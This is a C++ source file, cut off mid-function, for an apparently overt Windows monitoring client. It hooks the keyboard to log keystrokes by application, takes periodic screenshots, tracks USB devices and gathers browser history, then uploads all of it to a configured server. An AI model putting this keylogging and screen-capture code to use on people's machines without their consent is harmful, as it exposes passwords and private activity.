#include <windows.h>
#include <wininet.h>
// MinGW compatibility patch
#ifndef _OBJIDL_H_
#include <objidl.h>
#endif
#ifndef _PROPID_DEFINED
#define _PROPID_DEFINED
typedef ULONG PROPID;
#endif
#include <gdiplus.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <json/json.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <map>
#include <mutex>
#include <set>
#include <algorithm> // for std::replace
#include <iomanip>   // for std::put_time
#include <iphlpapi.h> // for GetAdaptersInfo
#include <ShellScalingApi.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Windows notification headers
#include <shellapi.h>
#include <commctrl.h>

// USB device notification constants (if not defined in MinGW)
#ifndef DBT_DEVICEARRIVAL
#define DBT_DEVICEARRIVAL 0x8000
#endif
#ifndef DBT_DEVICEREMOVECOMPLETE
#define DBT_DEVICEREMOVECOMPLETE 0x8004
#endif
#ifndef DBT_DEVTYP_DEVICEINTERFACE
#define DBT_DEVTYP_DEVICEINTERFACE 0x00000005
#endif
#ifndef GUID_DEVINTERFACE_USB_DEVICE
DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);
#endif

// Additional USB device GUIDs for better monitoring
#ifndef GUID_DEVINTERFACE_USB_HUB
DEFINE_GUID(GUID_DEVINTERFACE_USB_HUB, 0xF359721BL, 0xA47B, 0x11D5, 0x9C, 0xE8, 0x00, 0x50, 0x56, 0xB8, 0x7F, 0x00);
#endif

#ifndef GUID_DEVINTERFACE_DISK
DEFINE_GUID(GUID_DEVINTERFACE_DISK, 0x53F56307L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_CDROM
DEFINE_GUID(GUID_DEVINTERFACE_CDROM, 0x53F56308L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_KEYBOARD
DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD, 0x884b96c3L, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

#ifndef GUID_DEVINTERFACE_MOUSE
DEFINE_GUID(GUID_DEVINTERFACE_MOUSE, 0x378de44cL, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

// Device broadcast structures (if not defined in MinGW)
#ifndef DEV_BROADCAST_HDR
typedef struct _DEV_BROADCAST_HDR {
    DWORD dbch_size;
    DWORD dbch_devicetype;
    DWORD dbch_reserved;
} DEV_BROADCAST_HDR, *PDEV_BROADCAST_HDR;
#endif

#ifndef DEV_BROADCAST_DEVICEINTERFACE
typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
    DWORD dbcc_size;
    DWORD dbcc_devicetype;
    DWORD dbcc_reserved;
    GUID dbcc_classguid;
    char dbcc_name[1];
} DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;
#endif

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ws2_32.lib")

#define SCREEN_INTERVAL 60
#define TIC_INTERVAL 300
#define HISTORY_INTERVAL 600
#define KEY_INTERVAL 300
#define STORAGE_CHECK_INTERVAL 5
#define WM_TRAYICON (WM_USER + 1)
#define ID_TRAY_EXIT 1001
#define ID_TRAY_STATUS 1002

// Global variables
std::string macAddress;
std::string serverIP;
std::string serverPort;
std::string username;
int screenInterval = SCREEN_INTERVAL;
double lastBrowserTic = -1;
bool activeRunning = true;
std::vector<Json::Value> keyLogs;
std::vector<Json::Value> usbDeviceLogs;
std::vector<Json::Value> browserHistories;
std::mutex dataMutex;
HHOOK keyboardHook = NULL;
HHOOK mouseHook = NULL;

// System tray variables
NOTIFYICONDATAA nid;
HMENU hTrayMenu = NULL;
HWND hMainWindow = NULL;

// Connection status tracking
struct ConnectionStatus {
    bool serverConnected = false;
    bool previousServerConnected = false; // Track previous state for notifications
    std::string lastScreenshotStatus = "Never";
    std::string lastTicStatus = "Never";
    std::string lastHistoryStatus = "Never";
    std::string lastKeyLogStatus = "Never";
    std::string lastUSBLogStatus = "Never";
    std::string lastError = "";
    std::chrono::steady_clock::time_point lastSuccess = std::chrono::steady_clock::now();
};
std::mutex statusMutex;
ConnectionStatus connectionStatus;

// Browser history tracking - store last fetch times for each browser
int64_t lastChromeFetch = 0;
int64_t lastFirefoxFetch = 0;
int64_t lastEdgeFetch = 0;

// Log file for debugging
std::ofstream debugLogFile;

// Configuration
std::string API_BASE_URL;
std::string API_ROUTE = "/webapi.php";
std::string TIC_ROUTE = "/eventhandler.php";
std::string APP_VERSION = "1.0";

// USB monitoring using WMI
std::thread usbMonitoringThread;
bool usbMonitoringActive = false;

// Structure for browser history
struct BrowserHistoryEntry {
    std::string date;
    std::string url;
    std::string title;
};

// Structure for key log
struct KeyLogEntry {
    std::string date;
    std::string application;
    std::string key;
};

// Structure for USB device log
struct USBDeviceEntry {
    std::string date;
    std::string device;
    std::string action;
};

// Function declarations
std::string getMacAddress();
std::string getCurrentDateTimeString();
std::string getActiveWindowTitle();
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
std::string takeScreenshot();
bool sendScreenshot(const std::string& filePath);
bool sendTicEvent();
bool sendBrowserHistories();
bool sendKeyLogs();
bool sendUSBLogs();
void collectBrowserHistory();
void setupKeyboardHook();
void removeKeyboardHook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
std::string getLocalIPAddress();
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void setupUSBMONITORING();
void cleanupUSBMONITORING();
std::string httpPost(const std::string& url, const std::string& data);
std::string httpPostFile(const std::string& url, const std::string& filePath);
std::string getChromeHistory(int64_t sinceTime = 0);
std::string getFirefoxHistory(int64_t sinceTime = 0);
std::string getEdgeHistory(int64_t sinceTime = 0);
void monitorTask();
void writeDebugLog(const std::string& message);
bool loadSettings();
void setupSystemTray();
void cleanupSystemTray();
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void updateTrayIcon();
void showConnectionError(const std::string& error);
bool testServerConnection();
void showToastNotification(const std::string& title, const std::string& message, const std::string& type = "info");
void checkConnectionStatusChange();
void updateTrayMenu();

// Show Windows notification
void showToastNotification(const std::string& title, const std::string& message, const std::string& type) {
    // Use Windows Shell notification (balloon tip)
    if (nid.hWnd != NULL) {
        nid.uFlags = NIF_INFO;
        nid.dwInfoFlags = (type == "error") ? NIIF_ERROR : NIIF_INFO;
        strcpy_s(nid.szInfo, message.c_str());
        strcpy_s(nid.szInfoTitle, title.c_str());
        
        if (Shell_NotifyIconA(NIM_MODIFY, &nid)) {
            writeDebugLog("Windows notification shown successfully: " + title + " - " + message);
        } else {
            writeDebugLog("Failed to show Windows notification. Error: " + std::to_string(GetLastError()));
        }
    } else {
        writeDebugLog("System tray not available, cannot show notification");
    }
}

// Check for connection status changes and show notifications
void checkConnectionStatusChange() {
    std::lock_guard<std::mutex> lock(statusMutex);
    
    if (connectionStatus.serverConnected != connectionStatus.previousServerConnected) {
        if (connectionStatus.serverConnected) {
            showToastNotification("Server Connected", "Successfully connected to monitoring server", "info");
        } else {
            showToastNotification("Server Disconnected", "Lost connection to monitoring server", "error");
        }
        connectionStatus.previousServerConnected = connectionStatus.serverConnected;
    }
}

// Update tray menu with current status
void updateTrayMenu() {
    if (!hTrayMenu) return;
    
    // Clear existing menu items
    while (GetMenuItemCount(hTrayMenu) > 0) {
        DeleteMenu(hTrayMenu, 0, MF_BYPOSITION);
    }
    
    // Show user IP and MAC address
    std::string userIP = getLocalIPAddress();
    std::string mac = macAddress;
    std::string ipMac = "User IP: " + userIP + "  MAC: " + mac;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, ipMac.c_str());
    // Show server IP and port
    std::string serverInfo = "Server: " + serverIP + ":" + serverPort;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, serverInfo.c_str());
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    
    std::lock_guard<std::mutex> lock(statusMutex);
    
    // Add status items
    std::string serverStatus = std::string("Server: ") + (connectionStatus.serverConnected ? "Connected" : "Disconnected");
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, serverStatus.c_str());
    
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    
    std::string screenshotStatus = std::string("Screenshot: ") + connectionStatus.lastScreenshotStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, screenshotStatus.c_str());
    
    std::string ticStatus = std::string("Tic: ") + connectionStatus.lastTicStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, ticStatus.c_str());
    
    std::string historyStatus = std::string("History: ") + connectionStatus.lastHistoryStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, historyStatus.c_str());
    
    std::string keyLogStatus = std::string("Key Log: ") + connectionStatus.lastKeyLogStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, keyLogStatus.c_str());
    
    std::string usbLogStatus = std::string("USB Log: ") + connectionStatus.lastUSBLogStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, usbLogStatus.c_str());
    
    if (!connectionStatus.lastError.empty()) {
        AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
        std::string errorStatus = std::string("Error: ") + connectionStatus.lastError;
        AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, errorStatus.c_str());
    }
}

// Setup USB monitoring
void setupUSBMONITORING() {
    writeDebugLog("Starting USB monitoring setup...");
    
    usbMonitoringActive = true;
    usbMonitoringThread = std::thread([]() {
        writeDebugLog("USB monitoring thread started");
        
        std::set<std::string> knownDevices;
        int loopCount = 0;
        
        while (usbMonitoringActive) {
            loopCount++;
            writeDebugLog("USB monitoring loop iteration: " + std::to_string(loopCount));
            
            // Get current USB devices - enumerate all devices and filter for USB
            std::set<std::string> currentDevices;
            
            // Enumerate all devices
            HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
            if (deviceInfoSet != INVALID_HANDLE_VALUE) {
                writeDebugLog("USB devices info set created successfully");
                
                SP_DEVINFO_DATA deviceInfoData;
                deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
                
                DWORD deviceIndex = 0;
                while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
                    // Get device ID
                    char deviceId[256] = {0};
                    if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                        std::string deviceIdStr = deviceId;
                        
                        currentDevices.insert(deviceIdStr);
                        writeDebugLog("Found USB device: " + deviceIdStr);
                        
                        // Check if this is a new device
                        if (knownDevices.find(deviceIdStr) == knownDevices.end()) {
                            // New device connected
                            std::string deviceName = "USB Device";
                            
                            // Try to get friendly name
                            char friendlyName[256] = {0};
                            if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)friendlyName, sizeof(friendlyName), NULL)) {
                                deviceName = friendlyName;
                            } else {
                                char deviceDesc[256] = {0};
                                if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_DEVICEDESC, NULL, (PBYTE)deviceDesc, sizeof(deviceDesc), NULL)) {
                                    deviceName = deviceDesc;
                                }
                            }
                            
                            Json::Value usbLog;
                            usbLog["date"] = getCurrentDateTimeString();
                            usbLog["device_name"] = deviceName;
                            usbLog["device_path"] = deviceIdStr;
                            usbLog["device_type"] = "USB Device";
                            usbLog["action"] = "Connected";
                            
                            writeDebugLog("USB Device Connected: " + deviceName + " (" + deviceIdStr + ")");
                            
                            // Show toast notification for USB device connected
                            showToastNotification("USB Device Connected", deviceName, "info");
                            
                            std::lock_guard<std::mutex> lock(dataMutex);
                            usbDeviceLogs.push_back(usbLog);
                        }
                    }
                    deviceIndex++;
                }
                
                writeDebugLog("Total USB devices found: " + std::to_string(currentDevices.size()));
                SetupDiDestroyDeviceInfoList(deviceInfoSet);
            } else {
                writeDebugLog("Failed to create device info set. Error: " + std::to_string(GetLastError()));
            }
            
            // Check for disconnected devices
            for (const auto& device : knownDevices) {
                if (currentDevices.find(device) == currentDevices.end()) {
                    // Device disconnected
                    Json::Value usbLog;
                    usbLog["date"] = getCurrentDateTimeString();
                    usbLog["device_name"] = "USB Device";
                    usbLog["device_path"] = device;
                    usbLog["device_type"] = "USB Device";
                    usbLog["action"] = "Disconnected";
                    
                    writeDebugLog("USB Device Disconnected: " + device);
                    
                    // Show toast notification for USB device disconnected
                    showToastNotification("USB Device Disconnected", "USB device was removed", "warning");
                    
                    std::lock_guard<std::mutex> lock(dataMutex);
                    usbDeviceLogs.push_back(usbLog);
                }
            }
            
            knownDevices = currentDevices;
            
            // Sleep for 2 seconds before next check
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        
        writeDebugLog("USB monitoring thread stopped");
    });
    
    writeDebugLog("USB monitoring setup completed");
}

// Cleanup USB monitoring
void cleanupUSBMONITORING() {
    writeDebugLog("Cleaning up USB monitoring...");
    
    usbMonitoringActive = false;
    
    if (usbMonitoringThread.joinable()) {
        usbMonitoringThread.join();
    }
    
    writeDebugLog("USB monitoring cleanup completed");
}

// Get MAC address
std::string getMacAddress() {
    std::string macAddress;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "";
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "";
        }
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            // Accept both Ethernet and Wi-Fi adapters
            if ((pAdapter->Type == MIB_IF_TYPE_ETHERNET || pAdapter->Type == IF_TYPE_IEEE80211) &&
                pAdapter->AddressLength == 6) {
                char mac[18];
                sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5]);
                macAddress = std::string(mac);
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    
    free(pAdapterInfo);
    return macAddress;
}

// Get current date time string
std::string getCurrentDateTimeString() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Get active window title
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "Unknown";
    
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        char processName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, NULL, processName, sizeof(processName)) > 0) {
            CloseHandle(hProcess);
            return std::string(processName) + " (" + std::string(windowTitle) + ")";
        }
        CloseHandle(hProcess);
    }
    
    return std::string(windowTitle);
}

// Get key name from virtual key code
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags) {
    char keyName[256];
    UINT scanCodeMap = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    if (GetKeyNameTextA(scanCodeMap << 16, keyName, sizeof(keyName)) > 0) {
        return std::string(keyName);
    }
    
    // Fallback for common keys
    switch (vkCode) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Escape";
        case VK_TAB: return "Tab";
        case VK_SPACE: return "Space";
        case VK_BACK: return "Backspace";
        case VK_DELETE: return "Delete";
        case VK_INSERT: return "Insert";
        case VK_HOME: return "Home";
        case VK_END: return "End";
        case VK_PRIOR: return "Page Up";
        case VK_NEXT: return "Page Down";
        case VK_LEFT: return "Left";
        case VK_RIGHT: return "Right";
        case VK_UP: return "Up";
        case VK_DOWN: return "Down";
        case VK_F1: return "F1";
        case VK_F2: return "F2";
        case VK_F3: return "F3";
        case VK_F4: return "F4";
        case VK_F5: return "F5";
        case VK_F6: return "F6";
        case VK_F7: return "F7";
        case VK_F8: return "F8";
        case VK_F9: return "F9";
        case VK_F10: return "F10";
        case VK_F11: return "F11";
        case VK_F12: return "F12";
        default: return "Key" + std::to_string(vkCode);
    }
}

// Move GetEncoderClsid declaration up
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

// Take screenshot to temporary file
std::string takeScreenshot() {
    // Get the desktop window handle
    HWND hDesktop = GetDesktopWindow();
    
    // Get the desktop DC
    HDC hdcScreen = GetDC(hDesktop);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
    
    // Get the desktop dimensions (now DPI-aware)
    RECT desktopRect;
    GetWindowRect(hDesktop, &desktopRect);
    
    int captureWidth = desktopRect.right - desktopRect.left;
    int captureHeight = desktopRect.bottom - desktopRect.top;
    
    writeDebugLog("Desktop dimensions: " + std::to_string(captureWidth) + "x" + std::to_string(captureHeight));
    
    // Create a bitmap at the correct resolution
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
    
    // Capture the entire desktop
    BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save to temporary file using GDI+ with optimized compression
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hbmScreen, NULL);
    
    // Use JPEG encoder for better compression instead of PNG
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    // Set JPEG quality parameters for smaller file size
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    
    // Set quality to 70% (good balance between quality and size)
    ULONG quality = 70;
    encoderParams.Parameter[0].Value = &quality;
    
    // Create temporary file path
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFileName = std::string(tempPath) + "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    
    std::wstring wTempFileName(tempFileName.begin(), tempFileName.end());
    
    bmp->Save(wTempFileName.c_str(), &jpegClsid, &encoderParams);
    
    delete bmp;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    SelectObject(hdcMemory, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);
    
    return tempFileName;
}

// Move GetEncoderClsid definition above takeScreenshot
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Send screenshot to server
bool sendScreenshot(const std::string& filePath) {
    std::string url = API_BASE_URL + API_ROUTE;
    std::string response = httpPostFile(url, filePath);
    
    // Delete the temporary file after sending
    DeleteFileA(filePath.c_str());
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            if (root.isMember("Interval")) {
                screenInterval = root["Interval"].asInt();
            }
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastScreenshotStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        }
    }
    
    // Update connection status on failure
    {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastScreenshotStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Screenshot upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send tic event
bool sendTicEvent() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "Tic";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["Username"] = username;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            if (root.isMember("LastBrowserTic")) {
                lastBrowserTic = root["LastBrowserTic"].asDouble();
            }
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastTicStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        }
    }
    
    // Update connection status on failure
    {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastTicStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Tic event failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send browser histories
bool sendBrowserHistories() {
    if (browserHistories.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "BrowserHistory";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["Username"] = username;
    data["BrowserHistories"] = Json::Value(Json::arrayValue);
    
    for (const auto& history : browserHistories) {
        data["BrowserHistories"].append(history);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            browserHistories.clear();
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastHistoryStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        }
    }
    
    // Update connection status on failure
    {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastHistoryStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Browser history upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send key logs
bool sendKeyLogs() {
    if (keyLogs.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "KeyLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["Username"] = username;
    data["KeyLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& keyLog : keyLogs) {
        data["KeyLogs"].append(keyLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.clear();
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastKeyLogStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        }
    }
    
    // Update connection status on failure
    {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastKeyLogStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Key log upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send USB logs
bool sendUSBLogs() {
    if (usbDeviceLogs.empty()) return true;
    
    std::cout << "Sending " << usbDeviceLogs.size() << " USB logs" << std::endl;
    
    // Write to log file
    writeDebugLog("Sending " + std::to_string(usbDeviceLogs.size()) + " USB logs to server");
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "USBLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["Username"] = username;
    data["USBLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& usbLog : usbDeviceLogs) {
        data["USBLogs"].append(usbLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::cout << "USB Log JSON: " << jsonData << std::endl;
    
    std::string response = httpPost(url, jsonData);
    
    std::cout << "USB Log Response: " << response << std::endl;
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            usbDeviceLogs.clear();
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastUSBLogStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        }
    }
    
    // Update connection status on failure
    {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastUSBLogStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "USB log upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// HTTP POST request
std::string httpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: application/json\r\n";
    HttpAddRequestHeadersA(hConnect, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hConnect, NULL, 0, (LPVOID)data.c_str(), data.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// HTTP POST file upload
std::string httpPostFile(const std::string& url, const std::string& filePath) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    // Parse URL to get host and path
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    
    // Connect to host
    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
